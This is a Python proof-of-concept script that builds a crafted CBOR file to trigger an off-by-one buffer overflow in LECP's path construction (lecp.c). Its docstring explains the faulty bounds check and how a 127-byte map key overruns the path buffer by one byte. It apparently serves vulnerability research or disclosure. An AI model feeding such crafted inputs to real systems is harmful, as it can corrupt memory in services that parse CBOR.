#!/usr/bin/env python3
"""
Generate CBOR PoC for LECP path construction off-by-one (lecp.c:789-792).

The bug: the bounds check uses > instead of >=:
    if (pst->ppos + ctx->npos > sizeof(ctx->path))   // should be >=
        goto reject_overflow;
    memcpy(&ctx->path[pst->ppos], ctx->buf, (size_t)(ctx->npos + 1));

When ppos=1 (after '.' prefix from map entry) and npos=127 (key length),
ppos + npos = 128 = sizeof(ctx->path), the check passes (128 > 128 is false),
but memcpy writes 128 bytes (npos+1, including null terminator) starting at
path[1], overwriting path[128] — one byte past the buffer into cbor[0].

CBOR structure: a map with 1 entry, key = 127-byte text string, value = 0
  A1           - map(1)
  78 7F        - text string, 1-byte length = 127
  <127 bytes>  - "AAA...A" (127 'A' characters)
  00           - unsigned integer 0 (the value)
"""

import struct
import sys
import os

KEY_LEN = 127

cbor = bytearray()

# Map with 1 item: major type 5 (map), additional info 1
cbor.append(0xa1)

# Text string key: major type 3 (text), 1-byte length follows (additional info 24)
cbor.append(0x78)       # major type 3, additional info 24 (1-byte length follows)
cbor.append(KEY_LEN)    # length = 127
cbor.extend(b'A' * KEY_LEN)

# Value: unsigned integer 0
cbor.append(0x00)

out_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "poc_lecp_offby1.cbor")
with open(out_path, 'wb') as f:
    f.write(cbor)

print(f"Generated {out_path} ({len(cbor)} bytes)")
print(f"  Map with 1 entry:")
print(f"  Key: {KEY_LEN}-byte text string ('A' * {KEY_LEN})")
print(f"  Value: 0")
print(f"  ppos after '.' prefix: 1")
print(f"  npos (key length): {KEY_LEN}")
print(f"  ppos + npos = {1 + KEY_LEN} == sizeof(ctx->path) = 128")
print(f"  Check (> 128) passes, memcpy writes {KEY_LEN + 1} bytes at path[1]")
print(f"  path[128] overwritten — 1 byte into cbor[0]")
